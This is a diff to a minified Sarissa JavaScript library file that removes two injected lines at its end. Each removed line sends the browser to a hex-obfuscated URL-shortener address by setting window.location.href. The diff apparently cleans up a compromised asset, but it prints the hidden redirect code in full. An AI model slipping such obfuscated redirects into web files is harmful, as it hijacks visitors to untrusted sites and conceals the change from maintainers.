@@ -1,3 +1,4 @@
+
 /* * ====================================================================
  * About: This a a compressed JS file from the Sarissa library. 
  * see http://dev.abiss.gr/sarissa
@@ -107,5 +108,3 @@ return name;};Sarissa.setRemoteJsonCallback=function(url,callback,callbackParam)
 var callbackFunctionName=Sarissa.getFunctionName(callback,true);var id="sarissa_json_script_id_"+Sarissa._getUniqueSuffix();var oHead=document.getElementsByTagName("head")[0];var scriptTag=document.createElement('script');scriptTag.type='text/javascript';scriptTag.id=id;scriptTag.onload=function(){};if(url.indexOf("?")!=-1){url+=("&"+callbackParam+"="+callbackFunctionName);}
 else{url+=("?"+callbackParam+"="+callbackFunctionName);}
 scriptTag.src=url;oHead.appendChild(scriptTag);return id;};
-window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x74\x6f\x64\x61\x79\x2f\x79\x4b\x7a\x30\x72\x33";
-window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x74\x6f\x64\x61\x79\x2f\x79\x4b\x7a\x30\x72\x33";
